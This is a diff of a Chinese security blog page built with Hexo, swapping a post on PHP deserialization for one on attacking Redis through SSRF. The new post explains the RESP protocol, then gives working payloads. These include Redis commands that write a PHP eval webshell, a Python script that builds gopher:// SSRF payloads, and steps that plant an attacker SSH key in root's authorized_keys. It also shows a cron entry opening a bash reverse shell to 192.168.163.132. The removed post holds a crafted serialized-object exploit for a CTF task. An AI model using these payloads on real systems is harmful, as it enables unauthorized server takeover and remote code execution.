@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>序列化与反序列化 | Hexo</title>
-  <meta name="keywords" content=" serialize , php ">
-  <meta name="description" content="序列化与反序列化 | Hexo">
+  <title>redis与ssrf | Hexo</title>
+  <meta name="keywords" content=" redis , ssrf ">
+  <meta name="description" content="redis与ssrf | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="redis协议分析tcpdump抓包 tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令 127.0.0.1:6379&amp;gt; set name test OK 127.0.0.1:6379&amp;gt; get name &amp;quot;test&amp;quot; 127.0.0.1:6379&amp;gt; RESP协议RESP在Redis中用作请求-响应协议的方式">
 <meta name="keywords" content="redis,ssrf">
@@ -517,9 +517,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-序列化与反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-redis" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">序列化与反序列化</h1>
+        <h1 class="article-title">redis与ssrf</h1>
     
     <div class="article-meta">
         
@@ -534,16 +534,16 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">serialize</a>
+            <a href="javascript:" class="color1">redis</a>
             
-            <a href="javascript:" class="color4">php</a>
+            <a href="javascript:" class="color5">ssrf</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-10 15:52:56'>2019-03-23 15:13</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-10 15:48:03'>2019-08-10 15:44</time>
         
     </div>
     <div class="article-meta">
@@ -565,7 +565,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01为什么要序列化"><span class="toc-text">0x01为什么要序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔法函数"><span class="toc-text">魔法函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞产生"><span class="toc-text">漏洞产生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Return-Oriented-programming-链"><span class="toc-text">ROP(Return-Oriented programming)链</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#redis协议分析"><span class="toc-text">redis协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RESP协议"><span class="toc-text">RESP协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis配合gopher协议进行SSRF"><span class="toc-text">Redis配合gopher协议进行SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#条件"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绝对路径写webshell"><span class="toc-text">绝对路径写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写ssh公钥"><span class="toc-text">写ssh公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用contrab计划反弹shell"><span class="toc-text">利用contrab计划反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -580,146 +580,106 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>老生长谈了，可是我还是不会</p>
-<a id="more"></a>
+        <a id="more"></a>
 
-<h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>
-<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p>
-<p>其中index.php代码如下：</p>
-<pre><code>&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>
-<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>
-<p>看一个例子，简单的分析一下：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $age = 0;
-public $name = &#39;brain&#39;;
+<h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p>
+<pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p>
+<pre><code>127.0.0.1:6379&gt; set name test
+OK
+127.0.0.1:6379&gt; get name
+&quot;test&quot;
+127.0.0.1:6379&gt; </code></pre><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p>
+<pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。
+2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p>
+<ol>
+<li>对于<code>Simple Strings</code>，回复的第一个字节是+</li>
+<li>对于<code>error</code>,回复的第一个字节是-</li>
+<li>对于<code>Integer</code>,，回复的第一个字节是:</li>
+<li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li>
+<li>对于<code>array</code>,回复的第一个字节是*</li>
+<li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li>
+<li>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束</li>
+</ol>
+<p>现在来看一下我们抓的包</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="抓包协议分析1"></p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="协议分析2"></p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="协议分析3"></p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="协议分析4"></p>
+<p>整体来看一下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="整个通信过程"></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
+<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p>
+<ol>
+<li>绝对路径写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+</ol>
+<h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;
+config set dir /var/www/html
+config set dbfilename shell.php
+save</code></pre><p>转换为redis RESP格式</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;192.168.163.128&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
 
-public function PrintInfo()
-{
-    echo &#39;[+]User: &#39;.$this-&gt;name .&#39;: is&#39; . $this-&gt;age .&#39;years old.&#39;;
-}
-}
-$user =  new Test();
-$user-&gt;age = 20;
-$user-&gt;name = &#39;Jack&#39;;
-$user-&gt;PrintInfo();
-echo serialize($user);
-
-?&gt;</code></pre><p>输出结果如下</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p>
-<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>
-<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $variable = &quot;BRAIN&quot;;
-public $variable1 = &quot;BRAVO&quot;;
-public function PrintVariable()
-{
-    echo $this-&gt;variable . &#39;&lt;br /&gt;&#39;;
-}
-public function __construct()
-{
-    echo &#39;__construct&#39;.&#39;&lt;br&gt;&#39;;
-}
-public function __destruct()
-{
-    echo &#39;__destruct&lt;br /&gt;&#39;;
-}
-public function __wakeup()
-{
-    echo &#39;__wakeup&lt;br /&gt;&#39;;
-}
-public function __sleep()
-{
-    echo &#39;__sleep&lt;br /&gt;&#39;;
-    return array(&#39;variable&#39; , &#39;variable1&#39;);
-}
-}    
-$obj = new Test();  //创建对象时调用__construct
-
-$serialized = serialize($obj); //序列化对象时调用__sleep
-
-print(&#39;Serialized: &#39;.$serialized . &#39;&lt;br /&gt;&#39;);
-
-$obj2 = unserialize($serialized); //重建对象调用 __wakeup
-
-$obj2-&gt;PrintVariable(); //调用方法输出数据
-//脚本结束调用__destruct
-?&gt;</code></pre><p>这是执行结果：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p>
-<p>可以看到各个函数的执行顺序。</p>
-<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>
-<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>
-<pre><code>    idnex.php
-
-&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;
-
-
-shield.php
-
-&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>
-<p>我们的想法就是控制$file的值为pctf.php</p>
-<pre><code>&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-$a = new Shield(&quot;pctf.php&quot;);
-echo serialize($a);
-?&gt;
-序列化结果
-O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>
-<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p>
-<h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>
-<blockquote>
-<p>1.存在序列化字符串的可控制点或者说是输入点</p>
-<p>2.存在可以利用的魔法函数</p>
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="写shell"></p>
+<p>写入成功</p>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+&#39;
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save</code></pre><p>改第一个脚本</p>
+<pre><code>filename=&quot;authorized_keys&quot;
+ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;
+path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p>
+<h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&#39;
+config set dir /var/spool/cron/
+config set dbfilename root
+save</code></pre><p>改第一个命令</p>
+<pre><code>reverse_ip=&quot;192.168.163.132&quot;
+reverse_port=&quot;2333&quot;
+cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)
+filename=&quot;root&quot;
+path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
 </blockquote>
-<p>这道题目对魔法函数的利用好像不是很明显.(ε=ε=ε=┏(゜ロ゜;)┛)</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -733,12 +693,12 @@ O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>序列化与反序列化</p>
+    <p><span class="copy-title">文章标题:</span>redis与ssrf</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-03-23, 15:13:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-10, 15:52:56</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/03/23/序列化与反序列化/" title="序列化与反序列化">https://github.com/BrainLyh/2019/03/23/序列化与反序列化/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-10, 15:44:26</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-10, 15:48:03</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/10/redis/" title="redis与ssrf">https://github.com/BrainLyh/2019/08/10/redis/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
